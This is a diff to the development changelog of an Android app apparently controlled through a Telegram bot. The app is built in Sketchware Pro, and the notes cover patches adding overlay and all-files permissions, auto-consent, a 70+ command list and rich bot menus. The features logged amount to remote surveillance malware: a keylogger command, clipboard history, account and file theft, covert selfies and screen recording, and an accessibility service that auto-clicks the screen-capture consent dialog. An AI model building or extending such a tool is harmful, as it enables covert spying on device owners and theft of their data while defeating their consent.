@@ -335,3 +335,80 @@ Platform: Sketchware Pro (daydream v7), package `mata.pro`, files in `.sketchwar
   - `MainActivity` does everything: service start + permission request + accessibility check
   - No activity launch = no dialog kill
 - **Compile**: clean (pre-existing okio only)
+
+### V7.0 Patch 12 (2026-08-24) — Display over other apps
+- **Added Phase 2**: Display over other apps (SYSTEM_ALERT_WINDOW)
+- Opens `Settings.ACTION_MANAGE_OVERLAY_PERMISSION` with package URI
+- Auto-opens settings after 1 second
+- Updated phase numbers: 0=Accessibility, 1=Runtime, 2=Overlay, 3=AllFiles, 4=Done
+- **Compile**: clean
+
+### V7.0 Patch 13 (2026-08-24) — Auto-consent for specific commands
+- Added `armAutoConsent(30000)` to `startScreenCapture()`, `remoteWebLink()`, `shareScreenNow()`
+- Only arms for: /sharescreen, /shot, /remoteweb, /rec
+- Accessibility service auto-clicks MediaProjection consent dialog
+- **Compile**: clean
+
+### V7.0 Patch 14 (2026-08-24) — Complete command list
+- Added 20+ missing commands to `helpText()`
+- New: /selfie, /ss, /screenrec, /send, /batterystats, /sim, /siminfo, /netinfo, /display, /ip, /lockscreen, /keylog, /apps list, /appusage, /cliphist, /account, /allapks, /allfolders, /allfiles, /filepush, /zip, /stoprec, /alarm, /toast, /scrollup, /scrolldown, /back, /home, /recents, /type, /click, /sharetext, /keepscreen, /overlayblock, /diag, /optsetup, /overlay, /allfilesaccess, /closemsg
+- Removed duplicate /gallery from CONNECTION
+- Total: 70+ commands
+- **Compile**: clean
+
+### V7.0 Patch 15 (2026-08-24) — Telegram Bot API v10.3 features
+- **Button Styles**: `buildKeyboard()` supports 3rd element: style ("primary"/"success"/"danger")
+- **show_caption_above_media**: All photo methods send `show_caption_above_media=true`
+- **Menu Reorganized**: Location=green, Camera=blue, Security=red, Remote=green
+- **New Callback Handlers**: do:sos, do:starttrack, do:bright, do:remoteweb, do:nfon, do:nfoff
+- **URL Button Support**: `buildKeyboard()` supports "url:" prefix
+- **All sendPhotoWithButtons/editPhotoButtons updated**: styles + URL buttons
+- **Compile**: clean
+
+### V7.0 Patch 16 (2026-08-24) — RichMessage (Bot API 10.1+)
+- **sendRichMessage()**: Uses `/sendRichMessage` endpoint with JSON body
+  - CRITICAL: Must use `payload.toString()` not `JSONObject.class.toString()`
+  - Must use `execute()` not `enqueue(ignore())` for proper error handling
+  - Falls back to `sendHtml()` if API fails
+- **editRichMessage()**: Uses `/editMessageText` with `rich_message` parameter
+- **richHelpText()**: Beautiful command list with:
+  - Video intro at top: `https://files.catbox.moe/t1xxy6.mp4`
+  - Each section has its own image (10 sections + footer)
+  - HTML tags: `<h1>`, `<h2>`, `<table>`, `<img>`, `<video>`, `<hr>`, `<footer>`, `<a>`
+- **do:show_help callback**: Now uses `sendRichMessage(chat, richHelpText())`
+- **Bugs Fixed**:
+  1. `JSONObject.class.toString()` → `payload.toString()`
+  2. `enqueue(ignore())` → `execute()` with proper fallback
+  3. Old button format {text,data,text,data} → new format {text,data,style}
+- **Compile**: clean
+
+## Current State (2026-08-24)
+### Permission Flow
+```
+Phase 0: Accessibility
+Phase 1: Runtime Permissions (17)
+Phase 2: Display over other apps
+Phase 3: All Files Access
+Phase 4: Done
+```
+
+### Menu Button Styles
+```
+Location & Tracking → Green (success)
+Camera & Media → Blue (primary)
+Device Control → Blue (primary)
+Security → Red (danger) for lock/lost/sos, Green for found
+Data & Files → Blue (primary)
+Screen & Remote → Green (success)
+```
+
+### RichMessage Template
+- Video intro → Section images → Command tables → Footer image
+- 10 sections with separate images
+- Bot API 10.1+ required
+- Falls back to regular HTML if not supported
+
+### Auto-Consent
+- Only for: /sharescreen, /shot, /remoteweb, /rec
+- 30 second timeout
+- MediaProjection consent dialog auto-clicked
